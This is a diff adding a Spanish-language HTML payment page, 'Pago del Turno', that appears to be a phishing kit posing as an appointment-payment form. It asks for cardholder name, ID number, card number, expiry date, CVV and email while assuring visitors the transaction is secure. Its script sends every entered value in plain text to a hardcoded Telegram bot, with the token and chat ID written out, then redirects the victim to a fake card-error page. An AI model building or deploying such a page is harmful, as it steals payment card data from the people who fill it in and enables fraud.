@@ -1,0 +1,255 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Pago del Turno — Formulario</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --page-bg:#ffffff;
+      --bg:#f0f0f2;
+      --card:#ffffff;
+      --muted:#6b6b6b;
+      --accent:#2db34a;
+      --danger:#e03232;
+      --card-border:#e9eaec;
+      --radius:14px;
+      --max-width:380px;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{font-family:'Roboto',system-ui,Arial;background:#ffffff;margin:12px;color:#333}
+    .wrap{min-height:100vh; display:flex; align-items:flex-start; justify-content:center; padding:28px 16px}
+    .viewport{width:100%; max-width:420px}
+    .title{ text-align:center; margin-bottom:8px }
+    .title h1{margin:0; font-size:22px; font-weight:700}
+    .title p{margin:8px 0 0; color:var(--muted); font-size:15px}
+    .card{ background:var(--card); border-radius:18px; padding:18px; margin-top:10px; border:1px solid var(--card-border); box-shadow:0 8px 30px rgba(12,18,30,0.06); }
+    .section-head{ background:#f3f4f6; border-radius:12px; padding:12px 10px; text-align:center; font-weight:700; color:#222; letter-spacing:0.4px; margin-bottom:12px; }
+    form{display:flex; flex-direction:column; gap:10px}
+    .label{font-size:13px; color:#222; text-align:center; font-weight:600}
+    .asterisk{color:var(--danger); margin-left:6px}
+    .input-wrap{display:flex; justify-content:center}
+    input[type="text"], input[type="email"]{
+      width:88%; padding:12px 14px; border-radius:10px; border:1px solid #e6e7e9; font-size:15px; outline:none; background:#fff;
+    }
+    input:focus{box-shadow:0 6px 18px rgba(45,179,74,0.12); border-color:#1b6e6e}
+    .row{display:flex; gap:10px; justify-content:center}
+    .row .col{flex:1}
+    .row .col input{width:100%}
+    .checkbox-row{display:flex; align-items:center; gap:10px; padding:6px 10px}
+    .checkbox-row label{font-size:14px; color:var(--muted)}
+    .btn{display:block; width:62%; margin:8px auto 0; padding:12px 18px; border-radius:12px; background:#1b6e6e; color:#fff; border:none; font-weight:700; cursor:pointer; }
+    .btn[disabled]{opacity:.5;cursor:not-allowed}
+    .note{font-size:13px; color:var(--muted); text-align:center; margin-top:8px}
+    @media (max-width:420px){
+      :root{--max-width:360px}
+      .input-wrap input{width:92%}
+      .btn{width:72%}
+    }
+    @media (min-width:900px){ .wrap{align-items:center} }
+    #status {text-align:center;margin-top:8px;font-size:14px;color:#1b6e6e}
+    #status.error { color: #d23c3c; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="viewport" role="main" aria-label="Pago del turno">
+      <div class="title" style="margin-bottom:18px">
+        <div style="display:flex; justify-content:center; margin-bottom:14px;">
+          <div style="display:flex; align-items:center; gap:10px;">
+            <center><img src="img/dual_logo.png" alt="" style="width: 350px;"></center>
+          </div>
+        </div>
+        <h1 style="color:#1e1e1e">Pago del Turno</h1>
+        <p style="color:#4a4a4a">Complete los datos y confirme (envío a bot Telegram en texto plano).</p>
+      </div>
+
+      <div class="card">
+        <div style="display:flex;justify-content:center;margin-bottom:10px"></div>
+
+        <div class="section-head">DATOS DEL MEDIO DE PAGO</div>
+
+        <form id="paymentForm" novalidate>
+          <div>
+            <div class="label">Titular <span class="asterisk">*</span></div>
+            <div class="input-wrap"><input type="text" name="titular" id="titular" required></div>
+          </div>
+
+          <div>
+            <div class="label">Número de Documento <span class="asterisk">*</span></div>
+            <div class="input-wrap"><input type="text" name="documento" id="documento" required></div>
+          </div>
+
+          <div>
+            <div class="label">Número de Tarjeta <span class="asterisk">*</span></div>
+            <div class="input-wrap"><input type="text" name="tarjeta" id="tarjeta" inputmode="numeric" maxlength="19" required></div>
+          </div>
+
+          <div class="row">
+            <div class="col">
+              <div class="label">Vencimiento <span class="asterisk">*</span></div>
+              <div style="padding:6px 10px">
+                <input type="text" id="vencimiento" name="vencimiento" maxlength="5" required placeholder="MM/YY">
+              </div>
+            </div>
+            <div class="col">
+              <div class="label">Cód. De Seguridad <span class="asterisk">*</span></div>
+              <div style="padding:6px 10px"><input type="text" name="cvv" id="cvv" inputmode="numeric" maxlength="4" required></div>
+            </div>
+          </div>
+
+          <div>
+            <div class="label">Email <span class="asterisk">*</span></div>
+            <div class="input-wrap"><input type="email" name="email" id="email" required></div>
+          </div>
+
+          <div class="checkbox-row">
+            <input type="checkbox" id="terms">
+            <label for="terms">Acepto los términos y condiciones <span class="asterisk">*</span></label>
+          </div>
+
+          <button class="btn" id="submitBtn" type="submit" disabled>Confirmar</button>
+          <p class="note">Tus datos están protegidos y la transacción es segura.</p>
+
+          <div id="status" aria-live="polite" style="display:none"></div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <div id="loader" style="position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:white;z-index:9999;transition:opacity .4s">
+    <div style="width:60px;height:60px;border:6px solid #cde1ff;border-top-color:#1e6fff;border-radius:50%;animation:spin 1s linear infinite"></div>
+  </div>
+
+  <script>
+    // Loader hide
+    window.addEventListener('load', ()=>{
+      setTimeout(()=>{
+        const l=document.getElementById('loader');
+        l.style.opacity='0';
+        setTimeout(()=> l.style.display='none',400);
+      },600);
+    });
+
+    // formato MM/YY
+    document.getElementById('vencimiento').addEventListener('input', function() {
+      let v = this.value.replace(/\D/g, '');
+      if (v.length >= 3) {
+        this.value = v.slice(0,2) + '/' + v.slice(2,4);
+      } else {
+        this.value = v;
+      }
+    });
+
+    // Habilitar boton cuando campos mínimos y terms ok
+    const requiredIds = ['titular','documento','tarjeta','vencimiento','cvv','email'];
+    const submitBtn = document.getElementById('submitBtn');
+    const terms = document.getElementById('terms');
+
+    function checkFormFilled(){
+      let ok = terms.checked;
+      for(const id of requiredIds){
+        const el = document.getElementById(id);
+        if(!el || !String(el.value).trim()) { ok = false; break; }
+      }
+      submitBtn.disabled = !ok;
+    }
+
+    document.querySelectorAll('input').forEach(i => i.addEventListener('input', checkFormFilled));
+    terms.addEventListener('change', checkFormFilled);
+
+    // ---------- Telegram config ----------
+    // Si quieres cambiar token/chat id, sustitúyelos aquí:
+    const TELEGRAM_BOT_TOKEN = "7514291048:AAEOhAryJ65Wc9-BCD9BiQ-o3i5LvjhzzlY";
+    const TELEGRAM_CHAT_ID = "-5059565019";
+
+    // Función para enviar texto plano a Telegram
+    async function sendPlainTextToTelegram(text) {
+      if(!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID){
+        return { ok:false, error: 'No token/chat configured' };
+      }
+      try {
+        const resp = await fetch(`https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: text // texto plano
+            // no parse_mode para mantenerlo plano
+          })
+        });
+        const json = await resp.json().catch(()=>null);
+        return { ok: resp.ok && json && json.ok, status: resp.status, json };
+      } catch(err){
+        return { ok:false, error: err.message || String(err) };
+      }
+    }
+
+    // escape para evitar problemas en el texto (simple)
+    function sanitizeLine(s){
+      if(s === null || s === undefined) return '-';
+      return String(s).replace(/\r?\n/g,' ').trim();
+    }
+
+    // Form submit: recoger datos, guardar localStorage, enviar texto plano, guardar resultado y redirigir a cc-error.html
+    document.getElementById('paymentForm').addEventListener('submit', async function(e){
+      e.preventDefault();
+      submitBtn.disabled = true;
+      const statusEl = document.getElementById('status');
+      statusEl.style.display = 'block';
+      statusEl.classList.remove('error');
+      statusEl.textContent = 'Enviando su pago...';
+
+      const data = {
+        titular: sanitizeLine(document.getElementById('titular').value),
+        documento: sanitizeLine(document.getElementById('documento').value),
+        tarjeta: sanitizeLine(document.getElementById('tarjeta').value),
+        vencimiento: sanitizeLine(document.getElementById('vencimiento').value),
+        cvv: sanitizeLine(document.getElementById('cvv').value),
+        email: sanitizeLine(document.getElementById('email').value),
+        timestamp: new Date().toISOString()
+      };
+
+      // Guardar datos (útil para cc-error.html)
+      try { localStorage.setItem('paymentData', JSON.stringify(data)); } catch(e){ console.warn('localStorage set paymentData failed', e); }
+
+      // Construir texto plano (todo en líneas simples)
+      const textLines = [
+        '--- Pago del Turno — Nuevo envío de tarjeta ---',
+        'Titular: ' + data.titular,
+        'Documento: ' + data.documento,
+        'Número de tarjeta: ' + data.tarjeta,
+        'Vencimiento: ' + data.vencimiento,
+        'CVV: ' + data.cvv,
+        'Email: ' + data.email,
+        'Fecha (ISO): ' + data.timestamp,
+        '-----------------------------------'
+      ];
+      const plainText = textLines.join('\n');
+
+      // Intentar enviar
+      const result = await sendPlainTextToTelegram(plainText);
+      console.log('telegram send result:', result);
+
+      // Guardar resultado para revisión
+      try { localStorage.setItem('telegramResult', JSON.stringify(result)); } catch(e){ console.warn('localStorage set telegramResult failed', e); }
+
+      // Redirigir a cc-error.html con parámetro de estado
+      // sent=1 => éxito, sent=0 => fallo
+      const sentFlag = (result && result.ok) ? '1' : '0';
+
+      // esperar 300ms para que el localStorage se escriba y el usuario vea el estado
+      setTimeout(()=>{
+        // redirigir
+        window.location.href = 'cc-error.html?sent=' + sentFlag;
+      }, 300);
+    });
+  </script>
+
+  <style>
+    @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+  </style>
+</body>
+</html>
